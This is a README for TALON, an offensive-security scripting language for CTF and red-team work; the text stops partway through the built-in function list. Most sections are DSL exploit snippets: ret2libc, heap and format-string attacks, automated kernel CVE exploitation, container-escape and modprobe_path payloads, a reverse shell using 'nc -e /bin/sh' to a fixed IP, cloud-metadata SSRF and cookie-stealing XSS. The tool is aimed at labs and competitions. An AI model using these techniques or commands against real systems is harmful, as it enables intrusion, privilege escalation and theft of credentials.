# TALON — A Human Readable Scripting Language for Offensive Security

**TALON** is a **security native**, **exploit centric**, and **English like** DSL built for:

- Exploit developers
- CTF competitors
- Red teamers
- Reverse engineers
- Malware analysts
- Blockchain auditors

It combines **clarity**, **modularity**, and **native compilation** to express powerful attack logic in just a few readable lines.

> **ALPHA NOTICE**: TALON is under **active development**. Expect breaking changes, experimental syntax, and rapid iteration. Not yet production-safe. Ideal for CTF competitions, red team labs, research, or prototyping offensive techniques.

![status: alpha](https://img.shields.io/badge/status-alpha-yellow)
![compilation: passing](https://img.shields.io/badge/build-0%20errors-brightgreen)
![platform: windows+linux](https://img.shields.io/badge/platform-windows%20%7C%20linux-blue)
![modules: 138](https://img.shields.io/badge/modules-138-purple)
![phase: 23](https://img.shields.io/badge/phase-23-blue)

---

## Table of Contents

- [Quick Start](#quick-start)
- [Syntax Overview](#syntax-overview)
- [Core Features](#core-features)
- [CTF Competition Features (Phase 23)](#ctf-competition-features-phase-23)
- [Exploitation Primitives](#exploitation-primitives)
- [Advanced Capabilities](#advanced-capabilities)
- [Plugin System & Extensibility](#plugin-system--extensibility)
- [VSCode Extension](#vscode-extension)
- [Toolchain Modes](#toolchain-modes)
- [Platform Support](#platform-support)
- [Built-in Functions](#built-in-functions)
- [License](#license)

---

## Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/ridpath/talon.git
cd talon

# Build TALON
cargo build --release

# Run your first exploit
./target/release/talon run examples/buffer_overflow.talon

# Launch REPL
./target/release/talon repl
```

### Your First Exploit

```talon
// Connect to target
let s = connect("10.10.14.5", 1337)

// Find buffer overflow offset automatically
let offset = auto_offset("./vuln")

// Leak libc address
send(s, "A" * offset + "%6$p\n")
let leak = u64(recvline(s))

// Identify libc version via libc.rip
let matches = libc_search("puts", leak)
let libc_base = leak - matches[0].symbols["puts"]
let system = libc_base + matches[0].symbols["system"]
let binsh = libc_base + matches[0].symbols["str_bin_sh"]

// Send exploit
let payload = flat([cyclic(offset), system, binsh])
send(s, payload)

// Get shell
interactive(s)
```

---

## Syntax Overview

TALON prioritizes *readability and expression*, not semicolons or boilerplate. It's meant to read like a mix of pwntools, Python, and Metasploit console scripts.

### Basic Syntax

```talon
// Variables
let port = 1337
let target = "10.10.14.5"
let payload = "A" * 200

// Control flow
if port > 1024
    print("Using high port")
end

for i in range(10)
    print("Iteration:", i)
end

while connected
    let data = recv(s, 1024)
    if "flag{" in data
        break
    end
end

// Functions
define function exploit(host, port)
    let s = connect(host, port)
    send(s, payload)
    return recv(s, 1024)
end
```

### Exploitation Primitives

```talon
// Packing and unpacking
let addr = p64(0xdeadbeef)        // Pack 64-bit little-endian
let value = u32(data)              // Unpack 32-bit little-endian

// Cyclic patterns
let pattern = cyclic(200)
let offset = cyclic_find(0x61616161)

// Flat payload construction
let payload = flat([
    cyclic(offset),
    pop_rdi_ret,
    binsh_addr,
    system_addr
])

// Network operations
let s = connect("target.com", 1337)
send(s, payload)
sendline(s, "whoami")
let response = recvuntil(s, "flag{")
interactive(s)
```

---

## Core Features

### Philosophy

| Aspect          | Details                                                        |
| --------------- | -------------------------------------------------------------- |
| **Inspired by** | pwntools, Metasploit, Python, Ruby                            |
| **DSL**         | TALON is its own language – not YAML, Bash, or Lua            |
| **Abstraction** | Hides raw syscalls, bit twiddling, encoding – exposes *intent*|
| **Modular**     | 138 modules across 15+ security domains                       |
| **Readable**    | Code is self-documenting and understandable at a glance       |
| **Embeddable**  | REPL, compiled binary, interpreter – use however you like     |
| **CTF-ready**   | Built-in libc database, auto-offset, templates, flag search   |

### Design Goals

| Trait               | Description                                                      |
| ------------------- | ---------------------------------------------------------------- |
| **Minimalist**      | Python-like readability, no semicolons                          |
| **Modular**         | Domain-extensible via plugin system                             |
| **Scriptable**      | Behaves like pwntools: craft payloads, automate exploits        |
| **Exploit-centric** | Built around primitives like ROP, heap, kernel, format strings  |
| **Modern Heap**     | Tcache poisoning, safe-linking bypass, House of IO/Apple/Orange |
| **Kernel-aware**    | Automated kernel exploit generation, privilege escalation       |
| **Compilable**      | LLVM backend outputs native ELF                                 |
| **Cross-domain**    | Handle Ethereum, PE, ELF, shellcode, TCP beacons, and more      |

---

## CTF Competition Features (Phase 23)

TALON Phase 23 implements the 6 critical features needed to surpass pwntools for CTF competitions:

### 1. Libc Database Integration

Automatically identify and download libc versions using leaked addresses and libc.rip API. Downloads cached to `~/.talon/libc/`.

```talon
let s = connect("10.10.14.5", 1337)
let leak = u64(recv(s, 8))

// Search libc.rip with leaked address
let matches = libc_search("puts", leak)
if len(matches) > 0
    let libc = matches[0]
    print("Found libc:", libc.id)
    
    let libc_base = leak - libc.symbols["puts"]
    let system = libc_base + libc.symbols["system"]
    let binsh = libc_base + libc.symbols["str_bin_sh"]
    
    print("system():", hex(system))
    print("/bin/sh:", hex(binsh))
end
```

**Functions:**
- `libc_search(symbol, leaked_addr)` - Search libc.rip with single symbol
- `libc_symbols(libc_path)` - Extract all symbols from libc file
- `libc_symbol(libc_path, symbol_name)` - Get specific symbol address
- `libc_offset(libc_path, sym1, sym2)` - Calculate offset between symbols

### 2. Auto-Offset Finding

Automatically find buffer overflow offsets by running binary with cyclic pattern and analyzing crashes via GDB.

```talon
// Automatically find buffer overflow offset
let offset = auto_offset("./vuln")
print("Buffer offset:", offset)

// Craft exploit
let payload = "A" * offset + p64(win_addr)
send(conn, payload)
```

**Implementation:**
- Generates De Bruijn cyclic pattern
- Runs binary and captures crash via GDB/MI interface
- Extracts instruction pointer from crash
- Finds offset in pattern
- Supports stdin, args, and file input methods

**Functions:**
- `auto_offset(binary)` - Find offset via stdin
- `auto_offset_args(binary)` - Find offset via command-line args
- `auto_offset_file(binary, filepath)` - Find offset via file input

### 3. Exploit Templates

16 ready-to-use exploit templates with actual working code:

**Stack Exploits:**
- `shell` - Basic shellcode execution
- `buffer-overflow` - Simple buffer overflow to win function
- `rop-chain` - Return-oriented programming chain
- `ret2libc` - Full ret2libc with leak and second stage
- `stack-pivot` - Stack pivot to BSS/heap
- `sigrop` - Sigreturn-oriented programming
- `one-gadget` - one_gadget exploitation

**Heap Exploits:**
- `heap-spray` - Heap spraying with NOP sled
- `tcache-poison` - Tcache poisoning (glibc 2.26+)
- `fastbin-dup` - Fastbin duplication
- `house-of-orange` - House of Orange
- `house-of-io` - House of IO (FILE exploitation)

**Format String Exploits:**
- `fmt-leak` - Format string information leak
- `fmt-write` - Format string arbitrary write
- `fmt-rop` - Format string ROP chain

**Advanced:**
- `kernel-exploit` - Kernel privilege escalation

**Usage:**
```bash
talon template ret2libc 10.10.14.5 1337 > exploit.talon
talon run exploit.talon
```

Or from REPL:
```talon
print(get_template("ret2libc", "10.10.14.5", 1337))
```

### 4. Flag Search & Submit

Automatically find flags in data and submit to CTF platforms:

```talon
let data = recv(conn, 1024)
let flags = flag_search(data)
for flag in flags
    print("Found flag:", flag)
    flag_submit("https://ctf.example.com/api/submit", flag, token: "abc123")
end
```

**Supported Patterns:**
- `flag{...}`, `FLAG{...}`
- `CTF{...}`, `ctf{...}`
- `HTB{...}` (HackTheBox)
- `picoCTF{...}`
- `RACTF{...}`
- MD5/SHA256 hashes
- Base64-encoded strings (31+ chars)

**Functions:**
- `flag_search(data)` - Search with common patterns
- `flag_search_custom(data, pattern)` - Custom regex pattern
- `flag_search_file(filepath)` - Search file
- `flag_search_dir(directory)` - Recursive directory search
- `flag_submit(url, flag)` - Generic HTTP POST
- `flag_submit_ctfd(url, flag, challenge_id, token)` - CTFd API

### 5. Real GDB Output Parsing

Run binaries under GDB and parse crash information (registers, backtrace, signal):

```talon
let info = gdb_run("./vuln")
print("Signal:", info.signal)
print("Crash at:", hex(info.rip))
print("Registers:", info.registers)
```

**Features:**
- GDB/MI (Machine Interface) integration
- Parses registers (rax, rbx, rcx, rdx, rsi, rdi, rsp, rbp, rip)
- Extracts backtrace with function names
- Detects signal (SIGSEGV, SIGABRT, SIGILL, SIGFPE)
- Automatic offset calculation from crashes

**Functions:**
- `gdb_run(binary)` - Run and analyze crash
- `gdb_run_with_input(binary, input)` - With stdin input
- `gdb_run_args(binary, args)` - With command-line args
- `gdb_get_registers(binary)` - Extract register state
- `gdb_get_backtrace(binary)` - Get full backtrace

### 6. Interactive Quick-Mode Helpers

Interactive helper guides for common exploitation tasks:

```talon
quick_shell("10.10.14.5", 1337)
quick_rop("./vuln")
quick_pwn("./vuln", "10.10.14.5", 1337)
quick_heap()
quick_fmt()
```

Each helper prints:
- Step-by-step instructions
- Copy-pasteable one-liners
- Full script examples
- Common pitfalls and alternatives
- Related template commands

**Available Helpers:**
- `quick_shell(host, port)` - Instant reverse shell guide
- `quick_rop(binary)` - ROP chain building guide
- `quick_leak(connection)` - Leak helper with libc.rip integration
- `quick_pwn(binary, host, port)` - Complete exploit generation
- `quick_heap()` - Heap exploitation techniques
- `quick_fmt()` - Format string exploitation

---

## Exploitation Primitives

### Stack Exploitation

```talon
// Basic buffer overflow
let offset = auto_offset("./vuln")
let payload = "A" * offset + p64(win_function)
send(conn, payload)

// ret2libc with leak
let libc_leak = u64(recv(conn, 8))
let libc_base = libc_leak - 0x29d90  // puts offset
let system = libc_base + 0x50d70
let binsh = libc_base + 0x1d8678
let payload = flat([cyclic(offset), pop_rdi, binsh, system])

// ROP chain automation
let chain = auto_rop("./binary", "execve('/bin/sh', NULL, NULL)")
send(conn, chain)

// SROP (Sigreturn-oriented programming)
let frame = sigreturn_frame()
frame.rax = 59  // execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
let payload = flat([cyclic(offset), syscall_gadget, bytes(frame)])
```

### Heap Exploitation

```talon
// Tcache poisoning (glibc 2.26+)
let victim = malloc(0x80)
free(victim)
tcache_poison(victim, target_addr)
let chunk = malloc(0x80)  // Returns target_addr

// Tcache safe-linking bypass (glibc 2.32+)
let mangled = (heap_base >> 12) ^ target_addr
tcache_poison_safe_link(victim, mangled)

// Tcache key validation bypass (glibc 2.34+)
tcache_key_bypass(chunk, key_ptr)

// House of techniques
house_of_orange(io_list_all, fake_file)
house_of_io(stdout_addr, fake_vtable)
house_of_apple(wide_data, fake_jumps)
house_of_emma(tls_dtor_list, fake_destructor)

// Fastbin attack
fastbin_dup(chunk1, chunk2)
fastbin_into_stack(fastbin_chunk, stack_addr)
```

### Kernel Exploitation

```talon
// Gather kernel information
kernel_info()

// Automated CVE exploitation
kernel_exploit("CVE-2022-0847", "dirty_pipe")
kernel_exploit("CVE-2021-22555", "netfilter")
kernel_exploit("CVE-2022-34918", "netfilter_heap")

// Privilege escalation primitives
kernel_privesc("commit_creds", "prepare_kernel_cred")
kernel_privesc("modprobe_path", "/tmp/evil.sh")

// Kernel heap spraying
kernel_heap_spray("msg_msg", 1000, payload)
kernel_heap_spray("pipe_buffer", 500, fake_ops)
kernel_heap_spray("setxattr", 200, data)

// Container escape
container_escape("release_agent", "/tmp/breakout.sh")
container_escape("notify_on_release", "#!/bin/sh\ncp /bin/bash /tmp/rootbash")
```

### Format String Exploitation

```talon
// Leak values
let canary = fmt_read("./vuln", 13, 8)
let libc_leak = fmt_read("./vuln", 15, 8)
let stack_leak = fmt_read("./vuln", 1, 8)

// Write arbitrary values
fmt_write("./vuln", got_entry, system_addr)
fmt_write("./vuln", return_addr, one_gadget)

// Automated format string exploitation
let exploit = fmt_exploit("./vuln", target_addr, value, offset)
```

### Binary Analysis & Reverse Engineering

```talon
// Binary file analysis
disassemble("sample.exe")
let info = elf_info("binary")
let pe_data = pe_info("malware.exe")
let macho = macho_info("app.dylib")

// Symbol and section analysis
let symbols = get_symbols("binary")
let got = get_section(binary, ".got.plt")
let imports = get_imports("binary")

// Control flow analysis
let cfg = extract_cfg("binary", "main")
let calls = extract_call_graph("binary")

// String and crypto scanning
let strings = scan_strings("dump.bin")
let crypto = detect_crypto_constants("sample")
let vulns = scan_vulnerabilities("binary")

// Binary similarity
let similarity = binary_similarity("sample1", "sample2", "ssdeep")
let diff = binary_diff("original.exe", "patched.exe")
```

### Smart Contract Auditing

```talon
// Vulnerability scanning
audit_contract("MyContract.sol")
scan_for_reentrancy("contract.sol")
scan_for_integer_overflow("token.sol")
scan_for_access_control("contract.sol")

// EVM analysis
let abi = parse_abi_json("Contract.abi")
call_ethereum_node("https://rpc-url", "0xa9059c...")
let balance = get_balance("0x1234...")

// DeFi-specific vulnerabilities
scan_for_flashloan_attacks("defi_protocol.sol")
scan_for_oracle_manipulation("price_feed.sol")
scan_for_mev_vulnerabilities("dex.sol")
```

### Web Security

```talon
// Automated web scanning
web_scan("https://target.com", ["sqli", "xss", "ssrf"])

// SQL injection
sqli_test("https://target.com/page?id=1")
sqli_extract("https://target.com/vuln", "users", ["username", "password"])

// XSS detection
xss_scan("https://target.com/search", "q")
xss_payload_generator("reflected", "steal_cookies")

// SSRF exploitation
ssrf_test("https://target.com/fetch?url=")
ssrf_exploit("https://target.com/fetch?url=", "http://169.254.169.254/latest/meta-data/")
```

### Fuzzing & Taint Analysis

```talon
// Coverage-guided fuzzing
fuzz_binary("target", "seed_input.dat", 10000)
differential_fuzz("impl1", "impl2", corpus)

// Taint analysis
taint_analysis("vuln_binary", "stdin", ["stdout", "file_write:/tmp/out"])
let leaks = detect_info_leaks("binary")

// Crash analysis
let crash_info = analyze_crash("./vuln", crash_input)
let exploitable = check_exploitability(crash_info)
```

### Network Exploitation

```talon
// TCP/UDP connections
let s = connect("10.10.14.5", 1337)
send(s, payload)
let response = recv(s, 1024)
close(s)

// Reverse shells
quick_shell("10.10.14.5", 9001, "nc -e /bin/sh")
generate_shellcode("linux", "x64", "reverse_shell", "10.10.14.5:9001")

// Packet crafting
let pkt = craft_packet("tcp", src="192.168.1.5", dst="10.0.0.1", flags="SYN")
send_packet(pkt)

// Network scanning
let ports = port_scan("10.10.14.0/24", [80, 443, 22, 21])
```

### Forensics & Steganography

```talon
// Memory forensics
let processes = list_processes(memory_dump)
let strings = extract_strings(memory_dump, min_length=8)
let registry = parse_registry_hive("SYSTEM")

// File carving
let carved = carve_files(disk_image, ["jpg", "pdf", "docx"])

// Steganography
let hidden = stego_extract("image.png", method="lsb")
let entropy = stego_analyze("suspicious.jpg")
```

---

## Advanced Capabilities

### Symbiotic Execution - Cross-Process Memory Binding

Bind TALON variables to target process memory via `/proc/{pid}/mem` (Linux). Reads and writes synchronize between script variables and remote memory.

```talon
// Bind variables to target process memory
symlink 0x7fff1234 to $stack_ptr  type: memory
symlink @libc!system to $system_addr  type: symbol

// Variables reflect actual memory state
print("Stack pointer:", hex($stack_ptr))
print("system() address:", hex($system_addr))
```

**Implementation:**
- Uses `/proc/{pid}/mem` interface (Linux only)
- Requires ptrace attach permissions
- Live synchronization between TALON variables and process memory

### Goal-Oriented Planning - ROP Chain Synthesis

Declare exploitation goals and let the planner find gadgets from target binaries using Capstone disassembly and Z3 constraint solving.

```talon
// Declare goal and constraints
achieve goal: "arbitrary_write" 
    at address: 0xdeadbeef 
    with value: 0xcafebabe
    constraints: [no_null_bytes]
    using primitives: [write4, stack_pivot]

// Planner will:
// 1. Analyze binary with Capstone to find ROP gadgets
// 2. Apply Z3 constraints (NoNullBytes, Alphanumeric, InRange)
// 3. Generate executable TALON code
```

**Implementation:**
- Integrates `rop_gadget_finder` module (Capstone-based)
- Uses `z3_solver` for constraint satisfaction
- Generates AST commands (not string code)
- Supports gadget categories: StackPivot, LoadRegister, StoreMemory, ControlFlow

### Speculative Execution - Fork-Based Sandboxing

Execute commands in isolated child process to predict outcomes (Unix only). Uses fork/waitpid syscalls with signal-based crash detection.

```talon
// Test commands in sandbox before running
let future = speculate {
    mem_write(session, 0x400000, pop_rdi_ret)
    execute_next_step(session)
}

if future.outcome == "crash"
    print("Warning: Predicted crash")
    print("Probability:", future.probability)  // 95% on Unix
else
    // Safe to execute in real process
    mem_write(session, 0x400000, pop_rdi_ret)
end
```

**Implementation:**
- Uses `fork()` to create child process
- `waitpid()` with non-blocking status checks
- Signal detection: SIGSEGV/SIGBUS → Crash
- 5-second timeout with cleanup
- Returns: Success, Crash, Hang, SecurityViolation, Unknown

### AI-Assisted Exploitation

Generate exploits using AI models (requires API keys):

```talon
// AI exploit generation
ai_generate_exploit("buffer overflow", "x64", "ret2libc")
ai_analyze_binary("sample.exe")
ai_suggest_bypass("ASLR + DEP + canary")
```

**Supported Providers:**
- OpenAI (GPT-4, GPT-3.5)
- Anthropic (Claude)
- Local models (LM Studio)

---

## Plugin System & Extensibility

TALON features a modular plugin system that allows you to extend the language with custom modules, functions, and exploit primitives.

### Module Structure

```
talon_std/                  # Standard library
├── exploit/                # Exploitation primitives
│   ├── rop.talon
│   ├── heap.talon
│   ├── shellcode.talon
│   └── fmt_string.talon
├── re/                     # Reverse engineering
│   ├── disasm.talon
│   ├── binary_diff.talon
│   └── symbols.talon
├── kernel/                 # Kernel exploitation
│   ├── privesc.talon
│   ├── cve_db.talon
│   └── container.talon
├── blockchain/             # Smart contract auditing
│   ├── solidity.talon
│   ├── evm.talon
│   └── defi.talon
├── web/                    # Web security
│   ├── sqli.talon
│   ├── xss.talon
│   └── ssrf.talon
├── forensics/              # Digital forensics
│   ├── memory.talon
│   ├── carving.talon
│   └── stego.talon
└── malware/                # Malware analysis
    ├── unpacking.talon
    ├── sandbox.talon
    └── ioc.talon
```

### Creating Custom Modules

**1. Define a new module file:**

```talon
// File: ~/.talon/modules/custom_exploit.talon

define function my_custom_rop(binary, target)
    let gadgets = find_gadgets(binary, ["pop rdi", "ret"])
    let chain = build_chain(gadgets, target)
    return chain
end

define function my_custom_shellcode(platform, arch)
    let sc = generate_shellcode(platform, arch, "bind_shell")
    let encoded = xor_encode(sc, 0x42)
    return encoded
end
```

**2. Load the module in your script:**

```talon
// Import custom module
import "custom_exploit"

// Use custom functions
let chain = my_custom_rop("./vuln", "/bin/sh")
let payload = my_custom_shellcode("linux", "x64")
```

### Extending Core Functionality

**Add new primitives to the interpreter:**

1. Define grammar in `lang.pest`:
```pest
custom_command = { "mycmd" ~ ident ~ "with" ~ expr }
```

2. Map it in `parser.rs`:
```rust
Rule::custom_command => {
    // Parse command arguments
    Command::CustomCommand(args)
}
```

3. Handle it in `interpreter.rs`:
```rust
Command::CustomCommand(args) => {
    // Implement custom behavior
    Ok(())
}
```

4. Optionally add to standard library:
```talon
// File: talon_std/exploit/custom.talon
define function custom_helper(arg1, arg2)
    mycmd arg1 with arg2
    return result
end
```

### Plugin API

TALON provides a plugin API for Rust-based extensions:

```rust
// File: plugins/my_plugin/src/lib.rs
use talon_plugin_api::{Plugin, PluginContext, Value};

pub struct MyPlugin;

impl Plugin for MyPlugin {
    fn name(&self) -> &str {
        "my_plugin"
    }
    
    fn functions(&self) -> Vec<(&str, fn(&PluginContext, Vec<Value>) -> Value)> {
        vec![
            ("my_function", my_function_impl),
        ]
    }
}

fn my_function_impl(ctx: &PluginContext, args: Vec<Value>) -> Value {
    // Custom implementation
    Value::String("result".to_string())
}

#[no_mangle]
pub extern "C" fn _talon_plugin_init() -> Box<dyn Plugin> {
    Box::new(MyPlugin)
}
```

**Load plugin in TALON:**

```talon
// Load native plugin
load_plugin("plugins/my_plugin.so")

// Use plugin function
let result = my_function("arg1", "arg2")
```

### Community Modules

Install community-contributed modules:

```bash
# Install from official repository
talon install rop-advanced
talon install heap-tricks
talon install web-scanner

# Install from custom repository
talon install --repo https://github.com/user/talon-modules heap-spray-v2

# List installed modules
talon list-modules

# Update all modules
talon update-modules
```

---

## IDE Debugging & Visual Tools

TALON VSCode extension includes **source-level debugging**, visual memory inspection, and drag-and-drop ROP chain builder.

### Integrated Debugger

Debug TALON scripts with full GDB integration. Press F5 to start debugging any TALON file.

**Features:**
- **Breakpoints**: Click line numbers to set breakpoints
- **Step Execution**: F10 (next), F11 (step in), Shift+F11 (step out)
- **Variable Inspection**: Hover to see hex values
- **Register Panel**: Live RSP, RIP, RAX views
- **Memory Viewer**: Read memory at addresses
- **Call Stack**: Source-level stack navigation

### Visual Memory Visualizer

Interactive memory inspection with 5 tabs:
- **Stack**: View stack with color-coded annotations
- **Heap**: Heap chunk visualization
- **Mappings**: Memory regions (vmmap)
- **Search**: Find "/bin/sh" or patterns
- **Telescope**: Follow pointer chains

**Color Coding**: Red (cyclic patterns), Cyan (ROP), Yellow (shellcode)

### Visual ROP Chain Builder

Drag-and-drop ROP gadget construction:
1. Auto-scan binary for gadgets
2. Filter by null bytes
3. Drag to build chain
4. One-click code generation

### pwndbg Commands

| Command | Action |
|---------|--------|
| `checksec` | Binary protections |
| `vmmap` | Memory mappings |
| `search` | Find patterns |
| `telescope` | Follow pointers |

---

## VSCode Extension

TALON includes a comprehensive VSCode extension with syntax highlighting, auto-completion, snippets, and visual tools.

### Installation (Manual - Not in Marketplace Yet)

**Method 1: Install from VSIX file**

```bash
# Build the extension
cd vscode-extension
npm install
npm run compile
vsce package

# Install in VSCode
code --install-extension talon-language-3.1.0.vsix
```

**Method 2: Development mode**

```bash
cd vscode-extension
npm install
npm run watch

# In VSCode:
# 1. Press F5 to open Extension Development Host
# 2. Extension will be loaded in the new window
```

### Features

- **Syntax Highlighting**: Full TextMate grammar with 250+ built-in functions
- **Auto-completion**: Smart completions with Phase 23 functions
- **Code Snippets**: 24+ templates including all exploit types
- **Bracket Matching**: Auto-closing brackets, quotes, and parentheses
- **Code Folding**: Collapse regions for better organization
- **Visual Tools**: Memory visualizer, ROP chain builder, debugger panel
- **AI Assistant**: Smart exploit generation and analysis
- **Interactive Tutorials**: Step-by-step exploitation guides

### Commands

Access via Command Palette (`Ctrl+Shift+P` or `Cmd+Shift+P`):

**Phase 23 Commands:**
- **TALON: Search Libc Database** - Search libc.rip for version identification
- **TALON: Auto-Find Buffer Offset** - Automatically find overflow offset
- **TALON: Insert Exploit Template** - Insert production-ready exploit template
- **TALON: Search for Flags** - Scan output for CTF flags
- **TALON: Analyze with GDB** - Run binary under GDB and parse crashes
- **TALON: Quick Exploitation Helper** - Display interactive helper guides

**Core Commands:**
- **TALON: Run Exploit** (F5) - Execute current TALON script
- **TALON: Visual Exploit Builder** - Visual drag-and-drop exploit builder
- **TALON: Smart AI Assistant** - AI-powered exploit generation
- **TALON: Show Memory Visualizer** - Real-time memory viewer
- **TALON: Show ROP Chain Builder** - Interactive ROP chain constructor
- **TALON: Show Live Debugger** - Integrated debugger panel
- **TALON: Interactive Tutorials** - Step-by-step learning guides

### Snippets

Type the prefix and press `Tab` to expand:

**Phase 23 Snippets:**
- `libc-leak` - Leak and identify libc with libc.rip
- `auto-offset` - Automatic buffer overflow offset finding
- `ret2libc` - Full ret2libc exploit with leak and libc identification
- `flag-search` - Search for flags and submit to CTF platforms
- `gdb-crash` - Analyze crashes with GDB
- `quick-shell` - Interactive shell helper guide
- `quick-rop` - Interactive ROP building guide
- `tcache-poison` - Tcache poisoning heap exploit
- `sigrop` - SIGROP exploitation

**Classic Snippets:**
- `exploit-bof` - Buffer overflow exploit
- `rop-chain` - ROP chain template
- `exploit-fmt` - Format string exploit
- `remote` - Remote connection template
- `shellcode` - Shellcode generation
- `port-scan` - Port scanning

### Keybindings

- **F5**: Run current exploit
- **Ctrl+Shift+P**: Open command palette

---

## Toolchain Modes

TALON supports multiple execution modes for different use cases:

| Mode        | Command                        | Description                     |
| ----------- | ------------------------------ | ------------------------------- |
| Interpreted | `talon run script.talon`       | Run via embedded VM             |
| Compiled    | `talon build script.talon`     | Compiles to native ELF          |
| WASM        | `talon wasm script.talon`      | WebAssembly output              |
| REPL        | `talon repl`                   | Interactive interpreter         |
| Analyze     | `talon analyze binary`         | Disassembler + vulnerability scan |
| Fuzz        | `talon fuzz target`            | Coverage-guided fuzzing         |
| Kernel      | `talon kernel exploit CVE-ID`  | Automated kernel exploitation   |
| Smart Contract | `talon audit contract.sol`  | Smart contract security audit   |
| Web         | `talon web scan https://url`   | Web application security scan   |
| Template    | `talon template name args`     | Generate exploit from template  |

### Examples

```bash
# Run exploit in interpreted mode
talon run exploit.talon

# Compile to native binary
talon build exploit.talon -o exploit_binary

# Generate WebAssembly
talon wasm exploit.talon -o exploit.wasm

# Launch REPL
talon repl

# Analyze binary for vulnerabilities
talon analyze ./vuln_binary

# Fuzz target binary
talon fuzz ./target --corpus ./seeds --timeout 3600

# Exploit kernel vulnerability
talon kernel exploit CVE-2022-0847

# Audit smart contract
talon audit contract.sol --output report.json

# Scan web application
talon web scan https://target.com --output findings.json

# Generate exploit from template
talon template ret2libc 10.10.14.5 1337 > exploit.talon
```

---

## Platform Support

| Feature               | Linux | Windows | macOS | Notes |
| --------------------- | ----- | ------- | ----- | ----- |
| **Core DSL**          | Full  | Full    | Full  | All features |
| **Binary Formats**    | ELF   | PE      | Mach-O | goblin-based parsing |
| **ROP Gadget Finding**| Full  | Full    | Full  | Capstone disassembly |
| **Shellcode Generation**| Full | Full   | Full  | x64/x86/ARM |
| **Binary Analysis**   | Full  | Full    | Full  | goblin + Capstone |
| **Socket Tools**      | Full  | Full    | Full  | Standard TCP/UDP |
| **Process Memory Access**| Full | Limited | Limited | Linux: `/proc/{pid}/mem` |
| **Symbiotic Execution**| Full | None   | None  | Requires ptrace (Linux) |
| **Speculative Execution**| Full (95%) | Pattern (70%) | Full (95%) | fork/waitpid on Unix |
| **Kernel Exploitation**| Full | Basic  | None  | CVE database for Linux |
| **Heap Tools**        | Full (glibc) | Limited | Limited | glibc 2.23-2.39+ |
| **Debugger Integration**| GDB/MI | WinDbg (partial) | LLDB (partial) | Best on Linux |

**Legend:**
- **Full** - Fully functional with all features
- **Limited** - Basic functionality, platform-specific limitations
- **None** - Not supported on this platform

---

## Built-in Functions

TALON includes 250+ built-in functions across 15 categories:

### Data Manipulation

**Packing/Unpacking:**
- `p8(n)`, `p16(n)`, `p32(n)`, `p64(n)` - Pack integers (little-endian)
- `u8(data)`, `u16(data)`, `u32(data)`, `u64(data)` - Unpack integers (little-endian)
- `p8be(n)`, `p16be(n)`, `p32be(n)`, `p64be(n)` - Pack integers (big-endian)
- `u8be(data)`, `u16be(data)`, `u32be(data)`, `u64be(data)` - Unpack integers (big-endian)

**Pattern Generation:**
- `cyclic(length)` - Generate De Bruijn sequence
- `cyclic_find(value)` - Find offset in cyclic pattern
- `flat(list)` - Flatten mixed list into bytes

**Encoding:**
- `xor(data, key)` - XOR operation
- `xor_encode(data, key)` - XOR encode bytes
- `xor_decode(data, key)` - XOR decode bytes
- `hex(value)` - Convert to hexadecimal string
- `unhex(string)` - Parse hexadecimal string
- `b64(data)` - Base64 encode
- `unb64(string)` - Base64 decode

**Type Conversion:**
- `range(end)`, `range(start, end)` - Generate numeric sequence
- `bytes(value)` - Convert to byte array
- `str(value)` - Convert to string
- `len(value)` - Get length
- `int(value)` - Convert to integer

**File I/O:**
- `read(filepath)` - Read file as bytes
- `write(filepath, data)` - Write data to file

### Network Operations

- `connect(host, port)` - TCP connection
- `listen(port)` - TCP server
- `send(socket, data)` - Send data
- `recv(socket, length)` - Receive data
- `sendline(socket, line)` - Send line with newline
- `recvline(socket)` - Receive until newline
- `recvuntil(socket, delimiter)` - Receive until pattern
- `close(socket)` - Close connection
- `interactive(socket)` - Interactive shell mode

### Exploitation

**Libc Database:**
- `libc_search(symbol, address)` - Search libc.rip
- `libc_symbols(path)` - Extract symbols
- `libc_symbol(path, name)` - Get specific symbol
- `libc_offset(path, sym1, sym2)` - Calculate offset

**Auto-Offset:**
- `auto_offset(binary)` - Find overflow offset (stdin)
- `auto_offset_args(binary)` - Find offset (args)
- `auto_offset_file(binary, path)` - Find offset (file)

**ROP Chains:**
- `rop_chain(binary, gadgets)` - Build ROP chain
- `auto_rop(binary, goal)` - Automated ROP
- `find_gadgets(binary, types)` - Find specific gadgets

**Format Strings:**
- `fmt_read(binary, offset, size)` - Read memory
- `fmt_write(binary, address, value)` - Write memory
- `fmt_exploit(binary, target, value, offset)` - Automated

**Shellcode:**
- `shellcode(platform, arch, type)` - Generate shellcode
- `generate_shellcode(platform, arch, payload, args)` - Advanced generation
- `polymorphic_shellcode(shellcode, iterations)` - Polymorphic encoding

**Quick Helpers:**
- `quick_shell(host, port)` - Shell helper
- `quick_rop(binary)` - ROP helper
- `quick_pwn(binary, host, port)` - Complete exploit
- `quick_heap()` - Heap exploitation
- `quick_fmt()` - Format string helper

### Heap Exploitation

- `tcache_poison(chunk, target)` - Tcache poisoning
- `tcache_poison_safe_link(chunk, mangled)` - Safe-linking bypass
- `tcache_key_bypass(chunk, key_ptr)` - Key validation bypass
- `house_of_orange(io_list, fake_file)` - House of Orange
- `house_of_io(stdout, fake_vtable)` - House of IO
- `house_of_apple(wide_data, fake_jumps)` - House of Apple
- `house_of_emma(tls_dtor, fake_dtor)` - House of Emma
- `fastbin_dup(chunk1, chunk2)` - Fastbin duplication
- `fastbin_into_stack(chunk, target)` - Fastbin to stack

### Kernel Exploitation

- `kernel_info()` - Gather kernel information
- `kernel_exploit(cve, technique)` - Automated exploit
- `kernel_privesc(method, args)` - Privilege escalation
- `kernel_heap_spray(method, count, data)` - Heap spraying
- `container_escape(method, payload)` - Container breakout

### Binary Analysis

- `disassemble(binary)` - Disassemble binary
- `elf_info(binary)` - Parse ELF headers
- `pe_info(binary)` - Parse PE headers
- `macho_info(binary)` - Parse Mach-O headers
- `get_symbols(binary)` - Extract symbols
- `get_section(binary, name)` - Get section
- `get_imports(binary)` - Get imports
- `extract_cfg(binary, function)` - Control flow graph
- `extract_call_graph(binary)` - Call graph
- `scan_strings(binary)` - String extraction
- `detect_crypto_constants(binary)` - Crypto detection
- `scan_vulnerabilities(binary)` - Vulnerability scan
- `binary_similarity(bin1, bin2, method)` - Similarity
- `binary_diff(bin1, bin2)` - Binary diffing

### Smart Contracts

- `audit_contract(source)` - Full audit
- `scan_for_reentrancy(source)` - Reentrancy detection
